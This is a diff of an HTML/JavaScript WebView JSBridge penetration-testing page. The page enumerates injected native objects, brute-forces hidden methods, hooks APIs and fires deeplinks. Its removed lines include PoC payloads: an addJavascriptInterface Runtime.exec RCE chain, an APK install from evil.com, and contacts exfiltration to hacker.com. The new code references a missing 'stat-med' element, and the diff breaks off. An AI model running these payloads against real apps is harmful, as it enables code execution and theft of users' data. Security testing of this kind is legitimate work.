@@ -3,412 +3,523 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-<title>WebView Vuln Scanner Pro</title>
+<title>Ultimate JSBridge Penetration Lab</title>
 <style>
-:root {
-    --bg: #0d1117; --card: #161b22; --card-hover: #21262d; --border: #30363d;
-    --text: #c9d1d9; --text-dim: #8b949e;
-    --blue: #58a6ff; --red: #ff7b72; --yellow: #d29922; --green: #3fb950;
-    --purple: #bc8cff; --orange: #f0883e; --critical: #ff4444;
-    --font-size-base: 14px;
-}
-[data-theme="light"] {
-    --bg: #f6f8fa; --card: #ffffff; --card-hover: #f3f4f6; --border: #d0d7de;
-    --text: #24292f; --text-dim: #57606a;
-}
-* { box-sizing: border-box; }
-body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; font-size: var(--font-size-base); line-height: 1.5; }
-.container { max-width: 1000px; margin: 0 auto; padding: 15px; }
+    :root {
+        --bg: #0a0a10; --card: #13131f; --card-hover: #1c1c2e; --border: #2d2d44;
+        --text: #e0e0e0; --text-dim: #8a8a9f;
+        --blue: #00e5ff; --red: #ff3366; --yellow: #ffc107; --green: #00e676;
+        --purple: #d500f9; --orange: #ff9100;
+        --font-base: 13px;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; scrollbar-width: thin; scrollbar-color: var(--border) var(--bg); }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; background: var(--bg); color: var(--text); font-size: var(--font-base); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+    
+    /* 顶部信息栏 */
+    .header { background: var(--card); padding: 12px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+    .header h1 { font-size: 1.3em; color: var(--blue); text-shadow: 0 0 10px rgba(0,229,255,0.3); margin-bottom: 4px; }
+    .header-info { font-size: 0.8em; color: var(--text-dim); }
+    .stats-row { display: flex; gap: 15px; }
+    .stat-badge { padding: 4px 10px; border-radius: 4px; font-weight: bold; background: var(--bg); border: 1px solid var(--border); }
+    
+    /* 主体三栏布局 */
+    .workspace { display: flex; flex: 1; overflow: hidden; }
+    .panel { display: flex; flex-direction: column; background: var(--bg); border-right: 1px solid var(--border); }
+    .panel-title { background: var(--card); padding: 10px 15px; font-weight: bold; color: var(--text); border-bottom: 1px solid var(--border); flex-shrink: 0; display: flex; justify-content: space-between; align-items: center; }
+    .panel-content { flex: 1; overflow-y: auto; padding: 15px; }
+    
+    /* 按钮与输入框 */
+    .btn { padding: 6px 12px; background: var(--card); border: 1px solid var(--border); color: var(--text); border-radius: 4px; cursor: pointer; transition: all 0.2s; font-size: 0.9em; font-family: monospace; }
+    .btn:hover { background: var(--card-hover); border-color: var(--blue); }
+    .btn.primary { background: rgba(0, 229, 255, 0.1); border-color: var(--blue); color: var(--blue); }
+    .btn.danger { background: rgba(255, 51, 102, 0.1); border-color: var(--red); color: var(--red); }
+    .input-base { width: 100%; padding: 8px; background: var(--card); border: 1px solid var(--border); color: var(--text); border-radius: 4px; font-family: monospace; margin-bottom: 10px; outline: none; }
+    .input-base:focus { border-color: var(--blue); }
 
-/* 头部与通用组件 */
-.header { text-align: center; padding: 10px 0 20px; border-bottom: 1px solid var(--border); margin-bottom: 15px; }
-.header h1 { margin: 0; font-size: 1.6em; color: var(--blue); font-weight: 800; }
-.header p { color: var(--text-dim); font-size: 0.85em; margin-top: 5px; }
-.theme-toggle { position: absolute; top: 15px; right: 15px; background: var(--card); border: 1px solid var(--border); padding: 6px 12px; border-radius: 6px; cursor: pointer; color: var(--text); font-weight: bold; }
-.panel { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-.panel-title { font-size: 0.95em; font-weight: 600; margin-bottom: 12px; color: var(--blue); border-bottom: 1px solid var(--border); padding-bottom: 8px; display: flex; justify-content: space-between; }
+    /* 列表与树状图 */
+    .list-item { padding: 10px; background: var(--card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 8px; cursor: pointer; transition: 0.2s; }
+    .list-item:hover, .list-item.active { border-color: var(--blue); background: var(--card-hover); }
+    .risk-tag { padding: 2px 6px; border-radius: 3px; font-size: 0.7em; font-weight: bold; margin-left: 6px; color: #fff; }
+    .r-crit { background: var(--red); } .r-high { background: var(--orange); } .r-med { background: var(--yellow); color: #000; } .r-low { background: var(--green); color: #000; } .r-none { background: var(--border); }
+    
+    /* 树形组件 */
+    .tree-node { margin-bottom: 4px; }
+    .tree-header { display: flex; align-items: center; padding: 4px; border-radius: 4px; cursor: pointer; }
+    .tree-header:hover { background: var(--card); }
+    .tree-icon { width: 16px; color: var(--text-dim); }
+    .tree-key { color: var(--blue); font-weight: bold; margin-right: 8px; }
+    .tree-val { color: var(--text-dim); font-size: 0.9em; }
+    .action-btn { font-size: 0.7em; padding: 2px 6px; margin-left: auto; background: var(--bg); border: 1px solid var(--border); border-radius: 3px; color: var(--text); cursor: pointer; }
+    .action-btn:hover { background: var(--blue); color: #000; }
 
-/* 存储信息 */
-.storage-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; }
-.storage-item { padding: 10px; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; }
-.storage-label { font-size: 0.75em; color: var(--text-dim); margin-bottom: 6px; font-weight: bold; text-transform: uppercase; }
-.storage-value { font-size: 0.8em; word-break: break-all; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; max-height: 80px; overflow: auto; color: var(--green); }
+    /* 终端日志 */
+    .terminal { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 10px; flex: 1; overflow-y: auto; font-family: "Courier New", Courier, monospace; font-size: 0.9em; margin-bottom: 10px; display: flex; flex-direction: column; }
+    .log-line { margin-bottom: 4px; word-break: break-all; }
+    .log-time { color: var(--text-dim); margin-right: 8px; }
+    .log-info { color: var(--green); } .log-warn { color: var(--yellow); } .log-err { color: var(--red); } .log-hook { color: var(--purple); }
 
-/* Bridge调用 */
-.bridge-row { display: flex; gap: 8px; margin-bottom: 10px; }
-.input-base { flex: 1; padding: 8px 12px; border: 1px solid var(--border); border-radius: 6px; background: var(--bg); color: var(--text); font-family: monospace; }
-.btn-base { padding: 8px 16px; border: none; border-radius: 6px; background: var(--blue); color: #fff; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
-.btn-base:hover { opacity: 0.8; }
-.presets { display: flex; gap: 6px; flex-wrap: wrap; }
-.preset-btn { padding: 4px 10px; border: 1px solid var(--border); border-radius: 4px; background: var(--bg); color: var(--text); font-size: 0.75em; cursor: pointer; }
-.preset-btn:hover { background: var(--card-hover); }
+    /* 弹窗 */
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+    .modal-content { background: var(--card); border: 1px solid var(--border); border-radius: 8px; width: 100%; max-width: 800px; max-height: 80vh; display: flex; flex-direction: column; }
+    .modal-body { padding: 15px; overflow-y: auto; font-family: monospace; white-space: pre-wrap; font-size: 0.9em; }
 
-/* 漏洞案例 */
-.case-panel { border-left: 4px solid var(--red); }
-.case-item { background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 12px; margin-bottom: 10px; font-size: 0.85em; }
-.case-poc { background: #000; border: 1px solid #333; padding: 10px; font-family: monospace; color: var(--green); margin-top: 8px; border-radius: 4px; overflow-x: auto; }
-
-/* 统计与控制 */
-.stats { display: flex; gap: 8px; margin-bottom: 15px; }
-.stat-box { flex: 1; background: var(--card); border: 1px solid var(--border); padding: 10px; border-radius: 8px; text-align: center; }
-.stat-box .count { font-size: 1.5em; font-weight: 800; }
-.stat-box .label { font-size: 0.75em; color: var(--text-dim); margin-top: 4px; font-weight: bold; }
-.toolbar { display: flex; gap: 8px; margin-bottom: 15px; align-items: center; flex-wrap: wrap; }
-
-/* 列表渲染 */
-.item { background: var(--card); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 10px; border-left: 4px solid transparent; overflow: hidden; }
-.item.critical { border-left-color: var(--critical); }
-.item.high { border-left-color: var(--red); }
-.item.medium { border-left-color: var(--yellow); }
-.item.low { border-left-color: var(--green); }
-.item-header { padding: 12px; display: flex; justify-content: space-between; cursor: pointer; align-items: center; }
-.item-header:hover { background: var(--card-hover); }
-.item-body { display: none; padding: 12px; border-top: 1px solid var(--border); background: var(--bg); }
-.item.expanded .item-body { display: block; }
-.method-item { display: flex; align-items: center; gap: 10px; padding: 8px; background: var(--card); border: 1px solid var(--border); margin-bottom: 6px; border-radius: 6px; }
-.tag { font-size: 0.65em; padding: 2px 8px; border-radius: 12px; font-weight: bold; color: #fff; text-transform: uppercase; }
-.tag.critical { background: var(--critical); } .tag.high { background: var(--red); }
-.tag.medium { background: var(--yellow); color: #000; } .tag.low { background: var(--green); color: #000; }
-
-/* 模态框与Toast */
-.modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
-.modal.show { display: flex; }
-.modal-content { background: var(--card); border-radius: 12px; padding: 20px; width: 100%; max-width: 800px; max-height: 85vh; overflow: auto; border: 1px solid var(--border); }
-.toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--text); color: var(--bg); padding: 10px 20px; border-radius: 30px; font-weight: bold; opacity: 0; transition: opacity 0.3s, transform 0.3s; z-index: 2000; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
-.toast.show { opacity: 1; transform: translate(-50%, -10px); }
+    @media (max-width: 900px) { .workspace { flex-direction: column; overflow-y: auto; } .panel { border-right: none; border-bottom: 1px solid var(--border); min-height: 400px; flex: none; } }
 </style>
 </head>
 <body>
-<button class="theme-toggle" onclick="toggleTheme()">🌓 Theme</button>
-<div class="container">
-    <div class="header">
-        <h1>🛡️ WebView Vuln Scanner Pro</h1>
-        <p>动态沙箱比对 | 原型链深度探测 | 敏感数据搜集 | 自动化 PoC</p>
-    </div>
 
-    <div class="panel">
-        <div class="panel-title">📦 敏感环境配置 (被动信息收集)</div>
-        <div class="storage-grid">
-            <div class="storage-item"><div class="storage-label">Document Cookie</div><div class="storage-value" id="val-cookie"></div></div>
-            <div class="storage-item"><div class="storage-label">LocalStorage Keys</div><div class="storage-value" id="val-ls"></div></div>
-            <div class="storage-item"><div class="storage-label">User-Agent</div><div class="storage-value" id="val-ua"></div></div>
-            <div class="storage-item"><div class="storage-label">Location URL</div><div class="storage-value" id="val-url"></div></div>
-        </div>
+<div class="header">
+    <div>
+        <h1>🛡️ Ultimate JSBridge Lab</h1>
+        <div class="header-info" id="env-info">探测中...</div>
     </div>
-
-    <div class="panel">
-        <div class="panel-title">🔗 DeepLink / Scheme URL 盲测探针</div>
-        <div class="bridge-row">
-            <input type="text" class="input-base" id="bridge-url" placeholder="例如: jsbridge://getUserInfo?{}">
-            <button class="btn-base" onclick="fireDeeplink()">触发探测</button>
-        </div>
-        <div class="presets">
-            <button class="preset-btn" onclick="setBridge('jsbridge://')">jsbridge://</button>
-            <button class="preset-btn" onclick="setBridge('iosbridge://getUserInfo')">iOS getUserInfo</button>
-            <button class="preset-btn" onclick="setBridge('intent://#Intent;scheme=xxx;end')">intent://</button>
-            <button class="preset-btn" onclick="setBridge('alipays://platformapi/startapp')">alipays://</button>
-            <button class="preset-btn" onclick="setBridge('weixin://')">weixin://</button>
-        </div>
+    <div class="stats-row">
+        <div class="stat-badge" style="color:var(--blue)">原生对象: <span id="stat-total">0</span></div>
+        <div class="stat-badge" style="color:var(--red)">高危漏洞: <span id="stat-high">0</span></div>
+        <button class="btn primary" onclick="exportMarkdown()">📄 导出渗透报告</button>
     </div>
-
-    <div class="panel case-panel" id="matched-cases-panel" style="display:none;">
-        <div class="panel-title" style="color:var(--red);">🚨 发现已知高危漏洞模型 (漏洞 PoC)</div>
-        <div id="case-list"></div>
-    </div>
-
-    <div class="stats" id="stats"></div>
-    <div class="toolbar">
-        <input type="text" class="input-base" id="search" placeholder="搜索注入对象或方法名..." style="max-width: 250px;">
-        <button class="preset-btn" onclick="document.querySelectorAll('.item').forEach(e=>e.classList.add('expanded'))">展开</button>
-        <button class="preset-btn" onclick="document.querySelectorAll('.item').forEach(e=>e.classList.remove('expanded'))">折叠</button>
-        <button class="btn-base" style="background:var(--red);margin-left:auto;" onclick="location.reload()">🔄 强制重扫</button>
-        <button class="btn-base" style="background:var(--green);" onclick="exportReport()">📄 导出 Markdown</button>
-    </div>
-
-    <div id="results"></div>
 </div>
 
-<div class="modal" id="modal">
+<div class="workspace">
+    <div class="panel" style="width: 320px; flex-shrink: 0;">
+        <div class="panel-title">
+            <span>📦 注入对象池</span>
+            <button class="btn" style="padding: 2px 6px; font-size: 0.8em;" onclick="location.reload()">强制刷新</button>
+        </div>
+        <div class="panel-content" style="display: flex; flex-direction: column;">
+            <div id="object-list" style="flex: 1; overflow-y: auto; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px;"></div>
+            
+            <div style="flex-shrink: 0;">
+                <h3 style="color:var(--red); font-size:1em; margin-bottom:10px;">🔥 字典爆破 (Brute Force)</h3>
+                <select id="brute-target" class="input-base"></select>
+                <button class="btn danger" style="width: 100%;" id="btn-brute" onclick="startBruteForce()">💀 开始隐蔽方法撞库</button>
+                <div id="brute-progress" style="margin-top:8px; font-size:0.8em; color:var(--text-dim);">需选中上方列表中的无方法对象进行撞库。</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="panel" style="flex: 1;">
+        <div class="panel-title">
+            <span>🌳 深度分析与方法调用</span>
+            <button class="btn primary" id="btn-hook" onclick="toggleGlobalHook()">🎣 开启全局 API Hook</button>
+        </div>
+        <div class="panel-content" id="tree-container">
+            <div style="color:var(--text-dim); text-align:center; margin-top:50px;">👈 请先在左侧选择一个原生对象</div>
+        </div>
+    </div>
+
+    <div class="panel" style="width: 350px; flex-shrink: 0;">
+        <div class="panel-title"><span>📡 渗透监控终端 (Terminal)</span></div>
+        <div class="panel-content" style="display: flex; flex-direction: column;">
+            
+            <div class="terminal" id="terminal-log"></div>
+            
+            <div style="flex-shrink: 0;">
+                <input type="text" id="exec-path" class="input-base" style="color:var(--green); font-weight:bold;" placeholder="目标路径 (如 window.obj.func)">
+                <input type="text" id="exec-params" class="input-base" placeholder='输入参数 (如: {"key":"val"} 或 "123")'>
+                <div style="display: flex; gap: 8px; margin-bottom: 10px;">
+                    <button class="btn primary" style="flex: 1;" onclick="executeCommand()">⚡ 模拟调用</button>
+                    <button class="btn" style="flex: 1;" onclick="testDeeplink()">🔗 盲发 Deeplink</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal" id="report-modal">
     <div class="modal-content">
-        <h3 id="modal-title" style="margin-top:0;color:var(--blue);"></h3>
-        <pre id="modal-body" style="background:var(--bg);padding:15px;border-radius:6px;white-space:pre-wrap;font-size:0.85em;border:1px solid var(--border);"></pre>
-        <div style="display:flex;gap:10px;margin-top:15px;">
-            <button class="btn-base" style="flex:1;" onclick="copyModal()">一键复制报告</button>
-            <button class="btn-base" style="flex:1;background:var(--border);color:var(--text);" onclick="document.getElementById('modal').classList.remove('show')">关闭预览</button>
+        <div style="padding: 15px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items:center;">
+            <h2 style="color:var(--blue);margin:0;">渗透测试报告 (Markdown)</h2>
+            <div>
+                <button class="btn primary" onclick="copyReport()">复制内容</button>
+                <button class="btn" onclick="document.getElementById('report-modal').style.display='none'">关闭</button>
+            </div>
         </div>
+        <div class="modal-body" id="report-body"></div>
     </div>
 </div>
-<div class="toast" id="toast"></div>
 
 <script>
-// ==========================================
-// 核心逻辑闭包 (保护变量，防止污染环境)
-// ==========================================
+// ==============================================================================
+// 核心隔离闭包：保证引擎自身的变量绝对不污染全局 window，杜绝“自己扫自己”
+// ==============================================================================
 (function() {
-    // --- 1. 核心规则库与黑名单 ---
-    const VULN_KNOWLEDGE = {
-        "CVE-2012-6636": { category: "RCE", kw: ["getClass", "runtime", "invoke", "exec"], severity: "critical", desc: "Android <4.2 addJavascriptInterface 任意命令执行", poc: `window.[Bridge].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(['id']);` },
-        "CVE-2014-1939": { category: "RCE", kw: ["searchBoxJavaBridge_"], severity: "critical", desc: "Android <4.4 searchBoxJavaBridge_ 远程代码执行", poc: `window.searchBoxJavaBridge_.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(['id']);` },
-        "PAYMENT": { category: "支付越权", kw: ["pay", "alipay", "wxpay", "wallet", "checkout"], severity: "critical", desc: "未授权调用支付接口", poc: `window.[Bridge].pay({amount: 0.01, orderId: "test"});` },
-        "FILE_READ": { category: "文件读取", kw: ["readFile", "getFile", "openFile"], severity: "high", desc: "跨目录读取应用私有文件", poc: `window.[Bridge].readFile({path: "/data/data/[pkg]/shared_prefs/config.xml"});` },
-        "APP_INSTALL": { category: "静默安装", kw: ["installApp", "downloadApk", "silentInstall"], severity: "high", desc: "诱导或静默安装恶意APK", poc: `window.[Bridge].installApp({url: "http://evil.com/a.apk"});` },
-        "CONTACTS": { category: "隐私窃取", kw: ["getContacts", "addressBook"], severity: "high", desc: "静默获取用户通讯录上传", poc: `window.[Bridge].getContacts(function(c){ fetch('http://hacker.com/?c='+btoa(JSON.stringify(c))); });` },
-        "INTENT": { category: "Intent注入", kw: ["startActivity", "intent", "launchIntent"], severity: "high", desc: "通过Intent Scheme拉起隐式组件或越权", poc: `window.[Bridge].startActivity({action: "android.intent.action.VIEW", data: "intent://..."});` },
-        "DEVICE": { category: "指纹追踪", kw: ["getDeviceId", "imei", "mac", "uuid"], severity: "medium", desc: "获取设备唯一硬件标识", poc: `var id = window.[Bridge].getDeviceId();` },
-        "LOCATION": { category: "位置暴露", kw: ["getLocation", "gps", "position"], severity: "medium", desc: "静默获取真实物理位置", poc: `window.[Bridge].getLocation(function(l){...});` }
-    };
-
-    // 绝对黑名单：剔除原生 JS 原型链的内置方法，防止“噪音”污染报告
-    const IGNORE_METHODS = [
-        "apply", "bind", "call", "toString", "length", "name", "prototype", "constructor",
-        "hasOwnProperty", "isPrototypeOf", "propertyIsEnumerable", "toLocaleString", "valueOf",
-        "caller", "callee", "arguments"
-    ];
-
-    // --- 2. 纯净环境快照 (同步、第一时间执行) ---
-    function getInjectedProps() {
+    
+    // 【核心修复】第 0 毫秒的绝对纯净快照！
+    // 此时任何自身的 UI 工具函数（如 window.executeCommand）都还没有挂载！
+    const PURE_INJECTED_KEYS = (function() {
         try {
             const iframe = document.createElement("iframe");
             iframe.style.display = "none";
-            document.body.appendChild(iframe);
-            const cleanWindow = iframe.contentWindow;
-            
-            const currentProps = Object.getOwnPropertyNames(window);
-            const cleanProps = Object.getOwnPropertyNames(cleanWindow);
-            document.body.removeChild(iframe);
-            
-            // 过滤原生环境对象和浏览器事件 (无需过滤自身，因为此时扫描器自身函数还未挂载)
-            return currentProps.filter(p => !cleanProps.includes(p) && !p.startsWith("webkit") && !p.startsWith("on"));
+            document.documentElement.appendChild(iframe);
+            const cleanKeys = Object.getOwnPropertyNames(iframe.contentWindow);
+            const currKeys = Object.getOwnPropertyNames(window);
+            iframe.parentNode.removeChild(iframe);
+            return currKeys.filter(k => !cleanKeys.includes(k) && !k.startsWith("webkit") && !k.startsWith("on"));
         } catch(e) {
-            // Fallback 降级白名单
-            const fallbackList = ["window","document","location","navigator","localStorage","sessionStorage","setTimeout","setInterval","console"];
-            return Object.keys(window).filter(k => !fallbackList.includes(k) && !k.startsWith("on"));
+            return Object.keys(window).filter(k => !["window","document","location","navigator","localStorage","sessionStorage","console"].includes(k));
         }
+    })();
+
+    // 初始化 UI 日志
+    const terminal = document.getElementById('terminal-log');
+    function log(msg, type = 'info') {
+        const time = new Date().toLocaleTimeString();
+        let colorClass = 'log-info';
+        if(type === 'warn') colorClass = 'log-warn';
+        if(type === 'err') colorClass = 'log-err';
+        if(type === 'hook') colorClass = 'log-hook';
+        const line = document.createElement('div');
+        line.className = `log-line ${colorClass}`;
+        line.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
+        terminal.appendChild(line);
+        terminal.scrollTop = terminal.scrollHeight;
     }
 
-    function evaluateRisk(name, type) {
-        const s = name.toLowerCase();
-        for (const [id, rule] of Object.entries(VULN_KNOWLEDGE)) {
-            if (rule.kw.some(k => s.includes(k.toLowerCase()))) {
-                return { id, ...rule };
-            }
+    document.getElementById('env-info').innerText = navigator.userAgent;
+    log(`环境沙箱加载完毕: ${PURE_INJECTED_KEYS.length} 个非原生对象被捕获。`);
+
+    // --- 漏洞与特征知识库 ---
+    const KNOWLEDGE = {
+        "exec": { cat: "命令执行", kw: ["exec", "eval", "shell", "invoke", "runtime", "system"], r: "r-crit", desc: "可能执行系统命令" },
+        "app": { cat: "应用控制", kw: ["install", "uninstall", "downloadapk", "openapp"], r: "r-crit", desc: "静默安装或拉起恶意应用" },
+        "pay": { cat: "支付越权", kw: ["pay", "alipay", "wxpay", "wallet"], r: "r-crit", desc: "未授权拉起支付结算" },
+        "contact": { cat: "隐私窃取", kw: ["contact", "addressbook", "showaddressbook"], r: "r-high", desc: "获取用户敏感通讯录数据" },
+        "file": { cat: "文件跨域", kw: ["readfile", "writefile", "openfile"], r: "r-high", desc: "读取App私有目录" },
+        "auth": { cat: "认证劫持", kw: ["login", "oauth", "token", "signin", "auth"], r: "r-high", desc: "获取或伪造登录凭证" },
+        "intent": { cat: "路由逃逸", kw: ["startactivity", "intent", "jumppagepath", "openurl"], r: "r-high", desc: "越权拉起原生组件或URL" },
+        "device": { cat: "指纹追踪", kw: ["deviceid", "imei", "mac", "serial"], r: "r-med", desc: "获取设备硬件唯一标识" },
+        "storage": { cat: "数据操作", kw: ["storage", "put", "getdata", "setdata"], r: "r-med", desc: "操作本地持久化缓存" },
+        "location": { cat: "物理定位", kw: ["location", "gps", "position"], r: "r-med", desc: "获取真实物理坐标" },
+        "media": { cat: "媒体硬件", kw: ["camera", "photo", "audio", "record", "speechrecognition"], r: "r-low", desc: "调用摄像头、麦克风等外设" },
+        "ui": { cat: "UI交互", kw: ["toast", "alert", "navigation", "airportinterest", "policy"], r: "r-low", desc: "正常的界面展示或提示" }
+    };
+
+    function evalRisk(name) {
+        const str = name.toLowerCase();
+        for (let key in KNOWLEDGE) {
+            if (KNOWLEDGE[key].kw.some(kw => str.includes(kw))) return KNOWLEDGE[key];
         }
-        return type === "function" ? { category: "自定义方法", severity: "low" } : { category: "自定义对象", severity: "low" };
+        return { cat: "未分类自定义方法", r: "r-none", desc: "需人工确认功能" };
     }
 
-    // --- 3. 执行扫描动作 ---
-    const injectedProps = getInjectedProps(); // 【核心】此时快照最纯净
-    const scanResults = [];
-    const matchedVulnIds = new Set();
-    const stats = { critical: 0, high: 0, medium: 0, low: 0, total: 0 };
+    // --- 隐秘方法爆破字典 (应对无暴露方法的 Java 对象) ---
+    const BRUTE_DICT = [
+        "getUserInfo","getDeviceId","getToken","getAccessToken","login","pay","getLocation","read",
+        "write","upload","download","saveImage","openUrl","startActivity","jumpTo","getContacts",
+        "getClipboard","invoke","execute","call","postMessage","showAddressBook","canlePrivacyPolicy",
+        "callSpeechRecognition","getSimInfo","getImei","getMacAddress","execShell"
+    ];
 
-    injectedProps.forEach(key => {
-        try {
+    // JS 原生内部方法黑名单，保持报告纯净
+    const IGNORES = ["apply", "bind", "call", "toString", "length", "name", "prototype", "constructor", "caller", "callee"];
+
+    // --- 核心引擎：解析被捕获的纯净数据 ---
+    let globalScanData = [];
+    let isHooked = false;
+
+    function runAnalysis() {
+        let stats = { total: 0, high: 0, med: 0 };
+
+        PURE_INJECTED_KEYS.forEach(key => {
             const obj = window[key];
             const type = typeof obj;
-            if (type !== "object" && type !== "function") return;
-            
-            const objEval = evaluateRisk(key, type);
-            let maxSeverity = objEval.severity || "low";
+            if(type !== "object" && type !== "function") return;
+
             let methods = [];
+            let maxR = "r-none";
+            const objInfo = evalRisk(key);
 
-            if (objEval.id) matchedVulnIds.add(objEval.id);
-
-            // 深度遍历 + 原型链穿透
-            if (obj && (type === "object" || type === "function")) {
-                let keys = Object.getOwnPropertyNames(obj);
-                try { 
-                    const proto = Object.getPrototypeOf(obj); 
+            if(obj) {
+                try {
+                    let props = Object.getOwnPropertyNames(obj);
+                    const proto = Object.getPrototypeOf(obj);
                     if(proto && proto !== Object.prototype && proto !== Function.prototype) {
-                        keys = [...new Set([...keys, ...Object.getOwnPropertyNames(proto)])];
+                        props = [...new Set([...props, ...Object.getOwnPropertyNames(proto)])];
                     }
-                } catch(e){}
 
-                keys.forEach(k => {
-                    // 【核心优化】完美剔除 js 原生方法，保证报告干净
-                    if (IGNORE_METHODS.includes(k)) return; 
-                    
-                    try {
-                        const mType = typeof obj[k];
-                        const mEval = evaluateRisk(k, mType);
-                        if (mEval.id) matchedVulnIds.add(mEval.id);
+                    props.forEach(p => {
+                        if(IGNORES.includes(p)) return;
+                        const mType = typeof obj[p];
+                        const mInfo = evalRisk(p);
                         
-                        const order = { critical: 4, high: 3, medium: 2, low: 1 };
-                        if (order[mEval.severity] > order[maxSeverity]) maxSeverity = mEval.severity;
-                        
-                        methods.push({ name: k, type: mType, eval: mEval });
-                    } catch(e){}
-                });
+                        const levels = {"r-crit": 4, "r-high": 3, "r-med": 2, "r-low": 1, "r-none": 0};
+                        if(levels[mInfo.r] > levels[maxR]) maxR = mInfo.r;
+
+                        methods.push({ name: p, type: mType, info: mInfo });
+                    });
+                } catch(e) {}
             }
 
-            stats[maxSeverity]++;
             stats.total++;
-            scanResults.push({ name: key, type, severity: maxSeverity, eval: objEval, methods });
-        } catch(e) {}
-    });
+            if(["r-crit", "r-high"].includes(maxR)) stats.high++;
+            if(maxR === "r-med") stats.med++;
 
-    // 按风险等级倒序排序
-    const sortOrder = { critical: 0, high: 1, medium: 2, low: 3 };
-    scanResults.sort((a, b) => sortOrder[a.severity] - sortOrder[b.severity]);
-
-
-    // --- 4. 内部工具与UI渲染函数 ---
-    function showToast(msg) {
-        const t = document.getElementById("toast");
-        t.innerText = msg;
-        t.classList.add("show");
-        setTimeout(() => t.classList.remove("show"), 2500);
-    }
-
-    function renderList() {
-        const q = document.getElementById("search").value.toLowerCase();
-        const container = document.getElementById("results");
-        let html = "";
-        
-        scanResults.forEach((item) => {
-            if (q && !item.name.toLowerCase().includes(q) && !item.methods.some(m => m.name.toLowerCase().includes(q))) return;
-            
-            html += `<div class="item ${item.severity}">
-                <div class="item-header" onclick="this.parentNode.classList.toggle('expanded')">
-                    <div>
-                        <span style="font-weight:bold;font-size:1.15em;font-family:monospace;">window.${item.name}</span>
-                        <span style="font-size:0.8em;color:var(--text-dim);margin-left:10px;text-transform:uppercase;">[${item.eval.category}]</span>
-                    </div>
-                    <div><span class="tag ${item.severity}">${item.severity}</span> <span style="color:var(--text-dim);font-size:0.8em;margin-left:5px;">▼</span></div>
-                </div>
-                <div class="item-body">
-                    ${item.methods.length > 0 ? item.methods.map(m => `
-                        <div class="method-item">
-                            <span style="font-family:monospace;color:var(--blue);flex:1;font-weight:600;">.${m.name}()</span>
-                            <span style="color:var(--text-dim);font-size:0.8em;margin-right:10px;">[${m.type}]</span>
-                            ${m.eval.id ? `<span class="tag ${m.eval.severity}">${m.eval.category}</span>` : ''}
-                            <button class="preset-btn" style="margin-left:10px;border-color:var(--blue);color:var(--blue);" onclick="tryCall('${item.name}.${m.name}')">⚡ 调用执行</button>
-                        </div>
-                    `).join('') : '<div style="color:var(--text-dim);font-size:0.85em;padding:5px;">(该对象未暴露可枚举的子属性或方法)</div>'}
-                </div>
-            </div>`;
+            globalScanData.push({ name: key, type: type, info: objInfo, maxRisk: maxR, methods: methods });
         });
-        container.innerHTML = html || '<div style="text-align:center;padding:30px;color:var(--text-dim);">🔍 未匹配到任何接口</div>';
+
+        globalScanData.sort((a,b) => {
+            const levels = {"r-crit": 0, "r-high": 1, "r-med": 2, "r-low": 3, "r-none": 4};
+            return levels[a.maxRisk] - levels[b.maxRisk];
+        });
+
+        document.getElementById('stat-total').innerText = stats.total;
+        document.getElementById('stat-high').innerText = stats.high;
+        document.getElementById('stat-med').innerText = stats.med;
+
+        renderObjectList();
     }
 
-    function initUI() {
-        // 存储信息
-        document.getElementById("val-cookie").textContent = document.cookie || "(空)";
-        try { document.getElementById("val-ls").textContent = Object.keys(localStorage).join(", ") || "(空)"; } catch(e) { document.getElementById("val-ls").textContent = "访问受限/跨域"; }
-        document.getElementById("val-ua").textContent = navigator.userAgent;
-        document.getElementById("val-url").textContent = location.href;
+    // --- 渲染 UI ---
+    function renderObjectList() {
+        const listDiv = document.getElementById('object-list');
+        const sel = document.getElementById('brute-target');
+        listDiv.innerHTML = "";
+        sel.innerHTML = `<option value="">-- 选用目标进行强力爆破 --</option>`;
 
-        // 统计面板
-        document.getElementById("stats").innerHTML = `
-            <div class="stat-box" style="border-bottom: 4px solid var(--blue);"><div class="count" style="color:var(--blue)">${stats.total}</div><div class="label">发现 JSBridge 对象</div></div>
-            <div class="stat-box" style="border-bottom: 4px solid var(--critical);"><div class="count" style="color:var(--critical)">${stats.critical}</div><div class="label">严重风险 (RCE/支付)</div></div>
-            <div class="stat-box" style="border-bottom: 4px solid var(--red);"><div class="count" style="color:var(--red)">${stats.high}</div><div class="label">高风险 (文件/通讯录)</div></div>
-            <div class="stat-box" style="border-bottom: 4px solid var(--yellow);"><div class="count" style="color:var(--yellow)">${stats.medium}</div><div class="label">中风险 (指纹/定位)</div></div>
-        `;
